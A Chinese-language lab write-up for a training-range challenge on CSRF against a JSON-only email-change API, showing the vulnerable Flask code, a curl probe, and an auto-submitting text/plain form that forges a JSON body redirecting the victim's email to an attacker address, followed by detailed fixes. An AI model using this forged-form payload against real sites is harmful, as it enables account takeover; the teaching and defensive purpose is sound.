# JSON 接口的 CSRF

## 这一题在教什么

**「只收 JSON」不是 CSRF 防护。**

这个想法很常见，推理是这样的：

> HTML 表单只能发 `application/x-www-form-urlencoded`、`multipart/form-data`、
> `text/plain` 三种。而我这个接口只收 `application/json` —— 表单发不出来，
> 所以安全。

前半段对，后半段错。因为服务端如果**不看 Content-Type 就去解析请求体**，
那攻击者只要让 body 长得像 JSON 就行了 —— 而 `text/plain` 的表单编码
恰好可以做到这一点。

跟另一道 CSRF 题（`csrf/password_change`）的区别：

| | `csrf/password_change` | 这一题 |
|---|---|---|
| 攻击载体 | 普通表单 POST | `enctype="text/plain"` 的表单 |
| 要绕过什么 | 什么都没绕（服务端连来源都不看） | 「只收 JSON」这个假设 |

## 漏洞在哪

两处：

```python
# 洞 1：没有 CSRF token，只检查登录
if not session.get("user"):
    return jsonify({"error": "未登录"}), 401

# 洞 2：不看 Content-Type，直接拿请求体当 JSON 解析
raw = request.get_data(as_text=True) or ""
payload = json.loads(raw)
```

## 关键：`text/plain` 表单不做转义

HTML 规范里，三种表单编码的行为不一样：

| enctype | 编码方式 |
|---|---|
| `application/x-www-form-urlencoded` | 字段名和值都做百分号编码（`"` → `%22`） |
| `multipart/form-data` | 用 boundary 分隔，带 `Content-Disposition` |
| **`text/plain`** | **`name` + `=` + `value`，原样拼接，不做任何转义** |

第三种是这里的关键。所以只要能精心设计字段名，拼出来的整段 body 就是任意内容。

## 怎么打通

**第一步：先确认服务端真的不看 Content-Type。**

```bash
curl -X POST -H 'Content-Type: text/plain' \
     --data-raw '{"email":"x@y"}' \
     -b 'session=<你的 cookie>' \
     'http://<靶场>/v/csrf/json_api/api/email'
```

如果邮箱被改了，说明它只看 body。

**第二步：构造攻击页面。**

```html
<form action="<改邮箱接口>" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.example","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

拼出来的 body：

```
{"email":"attacker@evil.example","ignore":"="}
                                        ↑
                        表单那个等号变成了 ignore 字段的值
```

这是一段**合法 JSON**。多出来的 `ignore` 字段服务端不认识，但它不会报错。

**第三步：把受害者引到这个页面。**

（这一题的攻击者页面挂在 `/evil-json/`，是靶场里的第二个挂载点。）

## 这个判定的一个细节

服务端记录"有没有被打通"时，走的是跟另一道 CSRF 题一样的判据：
**请求带没带一个不属于本站的 Referer**。

- 攻击者页面发来的表单：浏览器会带上 `Referer: .../evil-json/` → 记一笔
- 个人中心自己的 fetch：`Referer` 指向本站 → 不算
- 直接 curl（不带 Referer）→ **不算**，因为那说明对面不是浏览器

最后一条容易搞错：「没有 Referer」不等于「跨站」，它只说明对面不是浏览器。

## 其他绕过「只收 JSON」的手法

| 手法 | 前提 |
|---|---|
| `enctype="text/plain"` 表单 | 服务端不看 Content-Type（这一题） |
| Flash + `crossdomain.xml` | 现在基本绝迹了 |
| 服务端把表单体和 JSON 都接受 | 那就是普通 CSRF |
| `fetch` + `mode: "no-cors"` | 只能发"简单请求"，且读不到响应 —— 但如果目的只是"改数据"，够了 |
| 利用已有的 XSS | XSS 直接就能发 JSON，跳过这一整类问题 |

## 怎么修

**一、CSRF token。** 这是根治：

```python
# 页面渲染时塞一个和 session 绑定的一次性 token
session["csrf"] = secrets.token_urlsafe(32)

# 接口里校验
if not secrets.compare_digest(request.headers.get("X-CSRF-Token", ""),
                              session.get("csrf", "")):
    abort(403)
```

注意接口型应用（纯 JSON API）的 token 通常放在**自定义请求头**里，
而不是表单字段 —— 自定义头跨站发不出来（会触发预检）。

**二、严格检查 Content-Type。**

```python
if not request.is_json:          # 即 Content-Type 是 application/json
    return jsonify({"error": "只接受 application/json"}), 415
```

这一句就能挡住这一题的攻击。**它不是完整的修复**（不能替代 token），
但它把"用表单伪造"这条路封掉了。

**三、检查 Origin / Sec-Fetch-Site。**

```python
origin = request.headers.get("Origin")
if origin and urlsplit(origin).netloc != request.host:
    abort(403)
```

浏览器对跨站请求一定会带 `Origin`（表单 POST 也带）。
`Sec-Fetch-Site: cross-site` 更直接，但老浏览器没有。

**四、敏感操作要求二次确认。**

改邮箱、改密码、改绑定手机这类操作，要求**再输一次密码**。
攻击者不知道旧密码，这一步就挡住了。这一条不依赖任何头，最可靠。

**五、Cookie 层面。** `SameSite=Lax` / `Strict` 能挡住大部分跨站场景。
但注意**它只是纵深防御**：如果攻击者站点和目标是同一个 site（比如都在
`*.example.com` 下，或者攻击者能往目标站写内容），Lax 挡不住。

## 顺手想想

- 如果接口加了 `request.is_json` 检查，但**没有** CSRF token，
  还有什么办法发这个请求？（提示：想 XSS、想 CORS 配置错误）
- 如果目标站点是 `https://`，攻击者页面是 `http://`，
  `text/plain` 的表单还能发吗？会有什么额外限制？
- 为什么自定义请求头（比如 `X-CSRF-Token`）跨站发不出来？
  这跟 CORS 的"简单的请求"定义有什么关系？
- 如果接口把 `ignore` 这种未知字段也照单全收地存进数据库，
  会多出什么风险？
